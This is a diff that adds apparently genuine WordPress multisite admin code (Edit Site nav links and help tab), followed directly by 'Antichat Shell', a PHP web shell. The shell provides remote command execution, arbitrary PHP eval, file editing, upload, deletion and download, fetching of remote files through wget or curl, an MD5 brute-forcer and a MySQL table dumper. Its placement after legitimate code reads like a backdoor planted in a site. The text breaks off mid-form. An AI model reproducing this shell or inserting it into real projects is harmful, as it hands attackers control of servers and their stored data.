+	 *
+	 * Default links: 'site-info', 'site-users', 'site-themes', and 'site-settings'.
+	 *
+	 * @since 4.6.0
+	 *
+	 * @param array $links {
+	 *     An array of link data representing individual network admin pages.
+	 *
+	 *     @type array $link_slug {
+	 *         An array of information about the individual link to a page.
+	 *
+	 *         $type string $label Label to use for the link.
+	 *         $type string $url   URL, relative to `network_admin_url()` to use for the link.
+	 *         $type string $cap   Capability required to see the link.
+	 *     }
+	 * }
+	 */
+	$links = apply_filters(
+		'network_edit_site_nav_links',
+		array(
+			'site-info'     => array(
+				'label' => __( 'Info' ),
+				'url'   => 'site-info.php',
+				'cap'   => 'manage_sites',
+			),
+			'site-users'    => array(
+				'label' => __( 'Users' ),
+				'url'   => 'site-users.php',
+				'cap'   => 'manage_sites',
+			),
+			'site-themes'   => array(
+				'label' => __( 'Themes' ),
+				'url'   => 'site-themes.php',
+				'cap'   => 'manage_sites',
+			),
+			'site-settings' => array(
+				'label' => __( 'Settings' ),
+				'url'   => 'site-settings.php',
+				'cap'   => 'manage_sites',
+			),
+		)
+	);
+
+	// Parse arguments.
+	$parsed_args = wp_parse_args(
+		$args,
+		array(
+			'blog_id'  => isset( $_GET['blog_id'] ) ? (int) $_GET['blog_id'] : 0,
+			'links'    => $links,
+			'selected' => 'site-info',
+		)
+	);
+
+	// Setup the links array.
+	$screen_links = array();
+
+	// Loop through tabs.
+	foreach ( $parsed_args['links'] as $link_id => $link ) {
+
+		// Skip link if user can't access.
+		if ( ! current_user_can( $link['cap'], $parsed_args['blog_id'] ) ) {
+			continue;
+		}
+
+		// Link classes.
+		$classes = array( 'nav-tab' );
+
+		// Aria-current attribute.
+		$aria_current = '';
+
+		// Selected is set by the parent OR assumed by the $pagenow global.
+		if ( $parsed_args['selected'] === $link_id || $link['url'] === $GLOBALS['pagenow'] ) {
+			$classes[]    = 'nav-tab-active';
+			$aria_current = ' aria-current="page"';
+		}
+
+		// Escape each class.
+		$esc_classes = implode( ' ', $classes );
+
+		// Get the URL for this link.
+		$url = add_query_arg( array( 'id' => $parsed_args['blog_id'] ), network_admin_url( $link['url'] ) );
+
+		// Add link to nav links.
+		$screen_links[ $link_id ] = '<a href="' . esc_url( $url ) . '" id="' . esc_attr( $link_id ) . '" class="' . $esc_classes . '"' . $aria_current . '>' . esc_html( $link['label'] ) . '</a>';
+	}
+
+	// All done!
+	echo '<nav class="nav-tab-wrapper wp-clearfix" aria-label="' . esc_attr__( 'Secondary menu' ) . '">';
+	echo implode( '', $screen_links );
+	echo '</nav>';
+}
+
+/**
+ * Returns the arguments for the help tab on the Edit Site screens.
+ *
+ * @since 4.9.0
+ *
+ * @return array Help tab arguments.
+ */
+function get_site_screen_help_tab_args() {
+	return array(
+		'id'      => 'overview',
+		'title'   => __( 'Overview' ),
+		'content' =>
+			'<p>' . __( 'The menu is for editing information specific to individual sites, particularly if the admin area of a site is unavailable.' ) . '</p>' .
+			'<p>' . __( '<strong>Info</strong> &mdash; The site URL is rarely edited as this can cause the site to not work properly. The Registered date and Last Updated date are displayed. Network admins can mark a site as archived, spam, deleted and mature, to remove from public listings or disable.' ) . '</p>' .
+			'<p>' . __( '<strong>Users</strong> &mdash; This displays the users associated with this site. You can also change their role, reset their password, or remove them from the site. Removing the user from the site does not remove the user from the network.' ) . '</p>' .
+			'<p>' . sprintf(
+				/* translators: %s: URL to Network Themes screen. */
+				__( '<strong>Themes</strong> &mdash; This area shows themes that are not already enabled across the network. Enabling a theme in this menu makes it accessible to this site. It does not activate the theme, but allows it to show in the site&#8217;s Appearance menu. To enable a theme for the entire network, see the <a href="%s">Network Themes</a> screen.' ),
+				network_admin_url( 'themes.php' )
+			) . '</p>' .
+			'<p>' . __( '<strong>Settings</strong> &mdash; This page shows a list of all settings associated with this site. Some are created by WordPress and others are created by plugins you activate. Note that some fields are grayed out and say Serialized Data. You cannot modify these values due to the way the setting is stored in the database.' ) . '</p>',
+	);
+}
+
+/**
+ * Returns the content for the help sidebar on the Edit Site screens.
+ *
+ * @since 4.9.0
+ *
+ * @return string Help sidebar content.
+ */
+function get_site_screen_help_sidebar_content() {
+	return '<p><strong>' . __( 'For more information:' ) . '</strong></p>' .
+		'<p>' . __( '<a href="https://wordpress.org/support/article/network-admin-sites-screen/">Documentation on Site Management</a>' ) . '</p>' .
+		'<p>' . __( '<a href="https://wordpress.org/support/forum/multisite/">Support Forums</a>' ) . '</p>';
+}
+<?php
+session_start();
+set_magic_quotes_runtime(0);
+set_time_limit(0);
+error_reporting(0);
+
+$self = $HTTP_SERVER_VARS['PHP_SELF'];
+if(get_magic_quotes_gpc()) {
+	foreach ($_POST as $k => $v) {
+		$_POST[$k] = stripslashes($v);
+	}
+}
+
+@ini_set('max_execution_time',0);
+if(@ini_get('safe_mode') == '1') {
+	$safe_mode="ON";
+} else {
+	$safe_mode="OFF";
+}
+if(@ini_get('disable_functions') != "") {
+	$disfunc = ini_get('disable_functions');
+} else {
+	$disfunc = 0;
+}
+if(strtoupper(substr(PHP_OS, 0, 3))==='WIN') {
+	$os = 1;
+} else {
+	$os = 0;
+}
+
+$action = $_POST['action'];
+$file = $_POST['file'];
+$dir = $_POST['dir'];
+$content = '';
+$stdata = '';
+$style = '<STYLE>
+BODY{background-color: #2b2f34;color: #9acd32;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #31333b;scrollbar-shadow-color: #363940;scrollbar-highlight-color: #363940;scrollbar-3dlight-color: #363940;scrollbar-darkshadow-color: #363940;scrollbar-track-color: #363940;scrollbar-arrow-color: #363940;}
+input{background-color: #31333b;font-size: 8pt;color: #b50016;font-family: Tahoma;border: 1 solid #666666;}
+select{background-color: #31333b;font-size: 8pt;color: #b50016;font-family: Tahoma;border: 1 solid #666666;}
+textarea{background-color: #363940;font-size: 8pt;color: #b50016;font-family: Tahoma;border: 1 solid #666666;}
+a:link{color: #91cd32;text-decoration: none;font-size: 8pt;}
+a:visited{color: #91cd32;text-decoration: none;font-size: 8pt;}
+a:hover, a:active{background-color: #A8A8AD;color: #E7E7EB;text-decoration: none;font-size: 8pt;}
+td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
+$header = '<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><body leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
+$footer = '</body></html>';
+$lang = array(
+	'filext'=>'File already exists.',
+	'uploadok'=>'File was successfully uploaded.',
+	'dircrt'=>'Dir is created.',
+	'dontlist'=>'Listing dir permission denide.',
+	'dircrterr'=>'Don\'t create dir.',
+	'dirnf'=>'Dir not found.',
+	'filenf'=>'File not found.',
+	'dontwrdir'=>'Only read current dir.',
+	'empty'=>'Directory not empty or access denide.',
+	'deletefileok'=>'File deleted.',
+	'deletedirok'=>'Dir deleted.',
+	'isdontfile'=>'Selected file this is link.',
+	'cantrfile'=>'Cant read file, permission denide.',
+	'onlyracc'=>'Don\'t edit, only read access.',
+	'workdir'=>'Work directory: ',
+	'fullacc'=>'Full access.',
+	'fullaccdir'=>'Full accees you are can create and delete dir.',
+	'thisnodir'=>'This is don\'t dir.',
+	'allfuncsh'=>'All function for work shell was disabled.'
+);
+
+$act = array('viewer','editor','upload','shell','phpeval','download','delete','deletedir','brute','mysql');//here added new actions
+
+function test_file($file){
+if(!file_exists($file))$err="1";
+	elseif(!is_file($file)) $err="2";
+	elseif(!is_readable($file))$err="3";
+	elseif(!is_writable($file)) {
+		$err="4";
+	} else {
+		$err="5";
+	}
+return $err;
+}
+
+function test_dir($dir){
+if(!file_exists($dir))$err="1";
+	elseif(!is_dir($dir)) $err="2";
+	elseif(!is_readable($dir))$err="3";
+	elseif(!is_writable($dir)) {
+	$err="4";
+	} else {
+	$err="5";
+	}
+return $err;
+}
+
+function perms($file) {
+  $perms = fileperms($file);
+  if (($perms & 0xC000) == 0xC000) {
+  	$info = 's';
+   }
+  elseif(($perms & 0xA000) == 0xA000) {
+  	$info = 'l';
+  	}
+  elseif(($perms & 0x8000) == 0x8000) {
+  	$info = '-';
+  	}
+  elseif(($perms & 0x6000) == 0x6000) {
+  	$info = 'b';
+  	}
+  elseif(($perms & 0x4000) == 0x4000) {
+  	$info = 'd';
+  	}
+  elseif(($perms & 0x2000) == 0x2000) {
+  	$info = 'c';
+  	}
+  elseif(($perms & 0x1000) == 0x1000) {
+  	$info = 'p';
+  } else {
+  	$info = 'u';
+  }
+  $info .= (($perms & 0x0100) ? 'r' : '-');
+  $info .= (($perms & 0x0080) ? 'w' : '-');
+  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
+  $info .= (($perms & 0x0020) ? 'r' : '-');
+  $info .= (($perms & 0x0010) ? 'w' : '-');
+  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
+  $info .= (($perms & 0x0004) ? 'r' : '-');
+  $info .= (($perms & 0x0002) ? 'w' : '-');
+  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
+  return $info;}
+
+function view_size($size){
+ if($size >= 1073741824) {
+ 	$size = @round($size / 1073741824 * 100) / 100 . " GB";
+ }
+ elseif($size >= 1048576) {
+ 	$size = @round($size / 1048576 * 100) / 100 . " MB";
+ }
+ elseif($size >= 1024) {
+ 	$size = @round($size / 1024 * 100) / 100 . " KB";
+ } else {
+ 	$size = $size . " B";
+ }
+return $size;}
+
+if(isset($action)) {
+	if(!in_array($action,$act)) {
+		$action = "viewer";
+	} else {
+		$action = $action;
+	}
+} else {
+	$action = "viewer";
+}
+
+if(isset($dir)){
+  $ts['test'] = test_dir($dir);
+  switch($ts['test']){
+    case 1:
+    	$stdata.=$lang['dirnf'];
+    break;
+    case 2:
+    	$stdata.=$lang['thisnodir'];
+    break;
+    case 3:
+    	$stdata.=$lang['dontlist'];
+    break;
+    case 4:
+    	$stdata.=$lang['dontwrdir'];
+    	$dir=chdir($GLOBALS['dir']);
+    break;
+    case 5:
+    	$stdata.=$lang['fullaccdir'];
+    	$dir=chdir($GLOBALS['dir']);
+    break;
+  }
+} else {
+	$dir=@chdir($dir);
+}
+
+$dir = getcwd()."/";
+$dir = str_replace("\\","/",$dir);
+
+if(isset($file)){
+    $ts['test1'] = test_file($file);
+  switch ($ts['test1']){
+    case 1:
+    	$stdata .=$lang['filenf'];
+    break;
+	case 2:
+		$stdata .=$lang['isdontfile'];
+	break;
+	case 3:
+		$stdata .=$lang['cantrfile'];
+	break;
+	case 4:
+		$stdata .=$lang['onlyracc'];
+		$file = $file;
+	break;
+	case 5:
+		$stdata .=$lang['fullacc'];
+		$file = $file;
+	break;
+  }
+}
+
+function shell($cmd) {
+  global $lang;
+
+$ret = '';
+if(!empty($cmd)) {
+  if(function_exists('exec')){
+  	@exec($cmd,$ret);$ret = join("\n",$ret);
+  } elseif(function_exists('shell_exec')) {
+  	$ret = @shell_exec($cmd);
+  } elseif(function_exists('system')) {
+  	@ob_start()
+  	;@system($cmd);
+  	$ret = @ob_get_contents();
+  	@ob_end_clean();
+  } elseif(function_exists('passthru')) {
+  	@ob_start();
+  	@passthru($cmd);
+  	$ret = @ob_get_contents();
+  	@ob_end_clean();
+  } elseif(@is_resource($f = @popen($cmd,"r"))) {
+  	$ret = "";
+  		while(!@feof($f)) {
+  			$ret .= @fread($f,1024);
+  		}
+  	@pclose($f);
+  } else {
+  	$ret=$lang['allfuncsh'];
+  }
+}
+return $ret;
+}
+
+function createdir($dir) {
+	mkdir($dir);
+}
+
+//delete file
+if($action == 'delete') {
+	if(unlink($file))
+	$content.=$lang['deletefileok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> Click here for back in viewer</a>";
+}
+
+//delete dir
+if($action == 'deletedir') {
+	if(!rmdir($file)) {
+		$content .=$lang['empty']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> Click here for back in viewer</a>";
+	} else {
+		$content .=$lang['deletedirok']."<a href=\"#\" onclick=\"document.reqs.action.value='viewer';document.reqs.dir.value='".$dir."'; document.reqs.submit();\"> Click here for back in viewer</a>";
+    }
+}
+
+//shell
+if($action == 'shell'){
+	$content .="<form method=\"POST\">
+	<input type=\"hidden\" name=\"action\" value=\"shell\">
+	<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
+	<textarea readonly rows=\"15\" cols=\"150\">".convert_cyr_string(htmlspecialchars(shell($_POST['command'])),"d","w")."</textarea><br>
+	<input type=\"submit\" value=\"execute\"></form>";
+}
+//editor
+if($action == 'editor'){
+  $stdata.="<tr><td><form method=POST>
+  <input type=\"hidden\" name=\"action\" value=\"editor\">
+  <input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
+  Open file:<input type=text name=file value=\"".($file=="" ? $file=$dir : $file=$file)."\" size=50><input type=submit value=\">>\"></form>";
+  function writef($file,$data){
+  $fp = fopen($file, "w+");
+  fwrite($fp, $data);
+  fclose($fp);
+}
+
+function readf($file){
+  clearstatcache();
+  $f = fopen($file, "r");
+  $contents = fread($f,filesize($file));
+  fclose($f);
+  return htmlspecialchars($contents);
+}
+
+if(@$_POST['save'])
+	writef($file, $_POST['data']);
+if(@$_POST['create'])
+	writef($file,"");
+$test = test_file($file);
+if($test ==1 ){
+	$content.="<form method=\"POST\">
+	<input type=\"hidden\" name=\"action\" value=\"editor\">
+	File name:<input type=\"text\" name=\"file\" value=\"".$file."\" size=\"50\"><br>
+	<input type=\"submit\" name=\"create\" value=\"Create new file with this name?\">
+	<input type=\"reset\" value=\"No\"></form>";
+}
+
+if($test > 2){
+	$content.="<form method=\"POST\">
+	<input type=\"hidden\" name=\"action\" value=\"editor\">
+	<input type=\"hidden\" name=\"file\" value=\"".$file."\">
+	<textarea name=\"data\" rows=\"30\" cols=\"180\">".@readf($file)."</textarea><br>
+	<input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>";
+}
+}
+
+//viewer
+if($action == 'viewer'){
+	$content.="<table cellSpacing=0 border=2 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
+	$content.="<tr><td><form method=POST><br>Open directory:  <input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\">>\"></form>";
+  		if (is_dir($dir)) {
+    		if (@$dh = opendir($dir)) {
+        		while (($file = readdir($dh)) !== false) {
+		  			if(filetype($dir . $file) == 'dir')
+		  				$dire[] = $file;
+		  			if(filetype($dir . $file) == 'file')
+		  				$files[] = $file;
+				}
+		closedir($dh);
+		@sort($dire);
+		@sort($files);
+		if ($GLOBALS['os'] == 1) {
+		   $content.="<tr><td>Select drive:";
+		   for ($j = ord('C'); $j <= ord('Z'); $j++)
+		   if (@$dh = opendir(chr($j).":/"))
+		   $content .='<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
+		   $content .="</td></tr>";
+		 }
+		$content .="<tr><td>Name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>";
+		for($i = 0;$i < count($dire);$i++) {
+		  $link = $dir.$dire[$i];
+		  $content .='<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td>
+<td>dir</td><td></td><td>'.perms($link).'</td><td><a href="#" onclick="document.reqs.action.value=\'deletedir\'; document.reqs.file.value=\''.$link.'\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>';
+		}
+		for($i = 0;$i < count($files);$i++) {
+		  $linkfile = $dir.$files[$i];
+		  $content .='<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td>
+<td>file</td><td>'.view_size(filesize($linkfile)).'</td><td>'.perms($linkfile).'</td><td><a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Download">D</a>
+<a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Edit">E</a><a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Delete this file">X</a></td></tr>';
+		}
+		$content .="</table>";
+		}
+	}
+}
+//downloader
+if($action == 'download') {
+header('Content-Length:'.filesize($file).'');
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="'.$file.'"');
+readfile($file);
+}
+//phpeval
+if($action == 'phpeval') {
+	$content.="<form method=\"POST\">
+	<input type=\"hidden\" name=\"action\" value=\"phpeval\">
+	<input type=\"hidden\" name=\"dir\" value=\"".$dir."\">
+	&lt;?php<br>
+	<textarea name=\"phpev\" rows=\"5\" cols=\"150\">".@$_POST['phpev']."</textarea><br>
+	?><br>
+	<input type=\"submit\" value=\"execute\"></form>";
+	if(isset($_POST['phpev']))
+		$content .=eval($_POST['phpev']);
+}
+//upload
+if($action == 'upload') {
+  if(isset($_POST['dirupload'])) {
+  		$dirupload = $_POST['dirupload'];
+  } else {
+  		$dirupload = $dir;
+  }
+  $form_win = "<table><form method=POST enctype=multipart/form-data>
+  <tr><td><input type=\"hidden\" name=\"action\" value=\"upload\">
+  Upload to dir: <input type=text name=dirupload value=\"".$dirupload."\" size=50><tr><td>New file name: <input type=text name=filename></td></tr><tr><td><input type=file name=file> <input type=submit name=uploadloc value='Upload local file'></td></tr>";
+  if($os == 1)
+  $content.=$form_win;
+  if($os == 0){
+    $content .=$form_win;
+	$content .='<tr><td><select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>File addres:<input type=text name=urldown>
+	<input type=submit name=upload value=Upload></form></td></tr>';
+	}
+
+if(isset($_POST['uploadloc'])) {
+if(!isset($_POST['filename'])) {
+	$uploadfile = $dirupload.basename($_FILES['file']['name']);
+} else {
+	$uploadfile = $dirupload."/".$_POST['filename'];
+}
+
+if(test_dir($dirupload) == 1 && test_dir($dir) != 3 && test_dir($dir) != 4) {
+	createdir($dirupload);
+}
+if(file_exists($uploadfile))$content .= $lang['filext'];
+	elseif (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
+$content .=$lang['uploadok'];
+}
+
+if(isset($_POST['upload'])){
+    if (!empty($_POST['with']) && !empty($_POST['urldown']) && !empty($_POST['filename']))
+	switch($_POST['with'])
+	{
+	  case wget:shell(which('wget')." ".$_POST['urldown']." -O ".$_POST['filename']."");break;
+ 	  case fetch:shell(which('fetch')." -o ".$_POST['filename']." -p ".$_POST['urldown']."");break;
+ 	  case lynx:shell(which('lynx')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
+ 	  case links:shell(which('links')." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
+ 	  case GET:shell(which('GET')." ".$_POST['urldown']." > ".$_POST['filename']."");break;
+ 	  case curl:shell(which('curl')." ".$_POST['urldown']." -o ".$_POST['filename']."");break;
+}}}
+//Brute
+if($action == 'brute'){
+
+function Brute() {
+ global $action,$pass_de,$chars_de,$dat,$date;
+ignore_user_abort(1);
+}
+
+if($chars_de == "") {
+	$chars_de ="";
+}
+$content ="<table><form action='$php_self' method=post name=md5><tr><td><b>Decrypte MD5</b>
+<tr><td>&nbsp;MD5 хеш:<b>".$pass_de."</b></td>
+<input type='hidden' name='action' value='$action'>
+<tr><td>&nbsp;<textarea  class='inputbox' name='chars_de' cols='50' rows='5'>".$chars_de."</textarea></td>
+<td><b>Перебор букв:</b><br><font color=red><b><u>ENG:</u></b></font>
+<a class=menu href=javascript:ins('abcdefghijklmnopqrstuvwxyz')>[a-z]</a>
+<a class=menu href=javascript:ins('ABCDEFGHIJKLMNOPQRSTUVWXYZ')>[A-Z]</a><br>
+<a class=menu href=javascript:ins('0123456789')>[0-9]</a>
+<a class=menu href=javascript:ins('~`\!@#$%^&*()-_+=|/?&gt;<[]{}:№.,&quot;')>[Символы]</a><br><br>
+<font color=red><b><u>RUS:</u></b></font>
+<a class=menu href=javascript:ins('абвгдеёжзийклмнопрстуфхцчшщъыьэюя')>[а-я]</a>
+<a class=menu href=javascript:ins('АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ')>[А-Я]</a>
+<br></br><input type=reset value=Очистить class=button1></td></tr>
+<tr><td>&nbsp;<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''>
+</td><td><input type='submit' value='Decrypt MD5' class=button1></td></tr></form>
+<script>
+function ins(text){
+document.md5.chars_de.value+=text;
+document.md5.chars_de.focus();}
+</script>";
+
+if($_POST['pass_de']) {
+$pass_de = htmlspecialchars($pass_de);
+$pass_de = stripslashes($pass_de);
+$dat = date("H:i:s");
+$date = date("d:m:Y");
+}
+{
+crack_md5();
+}
+}
+function crack_md5() {
+global $chars_de;
+$chars = $_POST[chars];
+ignore_user_abort(1);
+$chars_de = str_replace("<",chr(60),$chars_de);
+$chars_de = str_replace(">",chr(62),$chars_de);
+$c = strlen($chars_de);
+for($next = 0; $next <= 31; $next++) {
+	for($i1 = 0; $i1 <= $c; $i1++) {
+		$word[1] = $chars_de{$i1};
+	for($i2 = 0; $i2 <= $c; $i2++) {
+		$word[2] = $chars_de{$i2};
+	if($next <= 2) {
+		result(implode($word));
+	} else {
+		for ($i3 = 0; $i3 <= $c; $i3++) {
+		$word[3] = $chars_de{$i3};
+	if ($next <= 3) {
+		result(implode($word));
+	}else {
+	for($i4 = 0; $i4 <= $c; $i4++) {
+		$word[4] = $chars_de{$i4};
+	if($next <= 4) {
+		result(implode($word));
+	}else {
+	for ($i5 = 0; $i5 <= $c; $i5++) {
+		$word[5] = $chars_de{$i5};
+	if ($next <= 5) {
+		result(implode($word));
+	}else {
+	for ($i6 = 0; $i6 <= $c; $i6++) {
+		$word[6] = $chars_de{$i6};
+if ($next <= 6) {
+result(implode($word));
+}else {
+for ($i7 = 0; $i7 <= $c; $i7++) {
+$word[7] = $chars_de{$i7};
+if ($next <= 7) {
+result(implode($word));
+}else {
+for ($i8 = 0; $i8 <= $c; $i8++) {
+$word[8] = $chars_de{$i8};
+if ($next <= 8) {
+result(implode($word));
+}else {
+for ($i9 = 0; $i9 <= $c; $i9++) {
+$word[9] = $chars_de{$i9};
+if ($next <= 9) {
+result(implode($word));
+}else {
+for ($i10 = 0; $i10 <= $c; $i10++) {
+$word[10] = $chars_de{$i10};
+if ($next <= 10) {
+result(implode($word));
+}else {
+for ($i11 = 0; $i11 <= $c; $i11++) {
+$word[11] = $chars_de{$i11};
+if ($next <= 11) {
+result(implode($word));
+}else {
+for ($i12 = 0; $i12 <= $c; $i12++) {
+$word[12] = $chars_de{$i12};
+if ($next <= 12) {
+result(implode($word));
+}else {
+for ($i13 = 0; $i13 <= $c; $i13++) {
+$word[13] = $chars_de{$i13};
+if ($next <= 13) {
+result(implode($word));
+}else {
+for ($i14 = 0; $i14 <= $c; $i14++) {
+$word[14] = $chars_de{$i14};
+if ($next <= 14) {
+result(implode($word));
+}else {
+for ($i15 = 0; $i15 <= $c; $i15++) {
+$word[15] = $chars_de{$i15};
+if ($next <= 15) {
+result(implode($word));
+}else {
+for ($i16 = 0; $i16 <= $c; $i16++) {
+$word[16] = $chars_de{$i16};
+if ($next <= 16) {
+result(implode($word));
+}else {
+for ($i17 = 0; $i17 <= $c; $i17++) {
+$word[17] = $chars_de{$i17};
+if ($next <= 17) {
+result(implode($word));
+}else {
+for ($i18 = 0; $i18 <= $c; $i18++) {
+$word[18] = $chars_de{$i18};
+if ($next <= 18) {
+result(implode($word));
+}else {
+for ($i19 = 0; $i19 <= $c; $i19++) {
+$word[19] = $chars_de{$i19};
+if ($next <= 19) {
+result(implode($word));
+}else {
+for ($i20 = 0; $i20 <= $c; $i20++) {
+$word[20] = $chars_de{$i20};
+if ($next <= 20) {
+result(implode($word));
+}else {
+for ($i21 = 0; $i21 <= $c; $i21++) {
+$word[21] = $chars_de{$i21};
+if ($next <= 21) {
+result(implode($word));
+}else {
+for ($i22 = 0; $i22 <= $c; $i22++) {
+$word[22] = $chars_de{$i22};
+if ($next <= 22) {
+result(implode($word));
+}else {
+for ($i23 = 0; $i23 <= $c; $i23++) {
+$word[23] = $chars_de{$i23};
+if ($next <= 23) {
+result(implode($word));
+}else {
+for ($i24 = 0; $i24 <= $c; $i24++) {
+$word[24] = $chars_de{$i24};
+if ($next <= 24) {
+result(implode($word));
+}else {
+for ($i25 = 0; $i25 <= $c; $i25++) {
+$word[25] = $chars_de{$i25};
+if ($next <= 25) {
+result(implode($word));
+}else {
+for ($i26 = 0; $i26 <= $c; $i26++) {
+$word[26] = $chars_de{$i26};
+if ($next <= 26) {
+result(implode($word));
+}else {
+for ($i27 = 0; $i27 <= $c; $i27++) {
+$word[27] = $chars_de{$i27};
+if ($next <= 27) {
+result(implode($word));
+}else {
+for ($i28 = 0; $i28 <= $c; $i28++) {
+$word[28] = $chars_de{$i28};
+if ($next <= 28) {
+result(implode($word));
+}else {
+for ($i29 = 0; $i29 <= $c; $i29++) {
+$word[29] = $chars_de{$i29};
+if ($next <= 29) {
+result(implode($word));
+}else {
+for ($i30 = 0; $i30 <= $c; $i30++) {
+$word[30] = $chars_de{$i30};
+if ($next <= 30) {
+result(implode($word));
+}else {
+for ($i31 = 0; $i31 <= $c; $i31++) {
+$word[31] = $chars_de{$i31};
+if ($next <= 31) {
+result(implode($word));
+}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
+
+function result($word) {
+global $dat,$date;
+$pass_de = $_POST[pass_de];
+$dat2 = date("H:i:s");
+$date2 = date("d:m:Y");
+
+if(md5($word) == $pass_de){
+echo "<STYLE>BODY{background-color: #2b2f34;color: #9acd32;</STYLE><table><tr><td>Результат выполнения перебора паролей:</td></tr>
+<tr><td>Захешированный пароль:</b></td><td><font color=red>&nbsp;&nbsp;$word</font></td></tr>
+<tr><td>Начало перебора:</td><td>&nbsp;&nbsp;$dat - $date</td></tr>
+<tr><td>Окончание перебора:</td><td>&nbsp;&nbsp;$dat2 - $date2</td></tr>
+<tr><td>Выполнение перебора хешей записан в файл:  ".$word."_md5</td></tr></table>";
+$f = @fopen($word._md5,"a+");
+fputs($f,"Хэш из MD5 [$pass_de] = $word
+Начало перебора:\t$dat - $date
+Окончание перебора:\t$dat2 - $date2");
+exit;
+}}
+
+//Mysql
+
+if($action == 'mysql') {
+if(isset($_POST['dif'])) {
+	$fp = @fopen($_POST['dif_name'], "w");
+}
+  if((!empty($_POST['dif']) && $fp) || (empty($_POST['dif']))) {
+  $db = @mysql_connect('localhost',$_POST['mysql_l'],$_POST['mysql_p']);
+  if($db) {
+   if(@mysql_select_db($_POST['mysql_db'],$db)) {
+     $sql1 .= "# ---------------------------------\r\n";
+     $sql1 .= "#     date : ".date ("j F Y g:i")."\r\n";
+     $sql1 .= "# database : ".$_POST['mysql_db']."\r\n";
+     $sql1 .= "#    table : ".$_POST['mysql_tbl']."\r\n";
+     $sql1 .= "# ---------------------------------\r\n\r\n";
+
+     $res   = @mysql_query("SHOW CREATE TABLE `".$_POST['mysql_tbl']."`", $db);
+     $row   = @mysql_fetch_row($res);
+     $sql1 .= $row[1]."\r\n\r\n";
+     $sql1 .= "# ---------------------------------\r\n\r\n";
+
+     $sql2 = '';
+
+     $res = @mysql_query("SELECT * FROM `".$_POST['mysql_tbl']."`", $db);
+     if (@mysql_num_rows($res) > 0) {
+     while ($row = @mysql_fetch_assoc($res)) {
+     $keys = @implode("`, `", @array_keys($row));
+     $values = @array_values($row);
+     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
+     $values = @implode("', '", $values);
+     $sql2 .= "INSERT INTO `".$_POST['mysql_tbl']."` (`".$keys."`) VALUES ('".$values."');\r\n";
+     }
+     $sql2 .= "\r\n# ---------------------------------";
+     }
+     $content .="<center><b>Готово! Дамп прошел удачно!</b></center>";
+    if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
+    else { echo $sql1.$sql2; }
+    } // end if(@mysql_select_db($_POST['mysql_db'],$db))
+    else $content.="<center><b>Такой БД нет!</b></center>";
+   @mysql_close($db);
+   }
+ } // end if(($_POST['dif']&&$fp)||(!$_POST['dif'])){
+ else if(!empty($_POST['dif'])&&!$fp) { $content.="<center><b>ОШИБКА, нет прав записи в файл!</b></center>"; }
+
+$content.="<form name='mysql_dump' action='$php_self' method='post'>
+<input type='hidden' name='action' value='$action'>
+&nbsp;База: <input type=text name=mysql_db size=15 value=";
+$content .=(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"));
+$content .=">&nbsp;Таблица: &nbsp;<input type=text name=mysql_tbl size=15 value=";
+$content .=(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"));
+$content .=">&nbsp;Логин: &nbsp;<input type=text name=mysql_l size=15 value=";
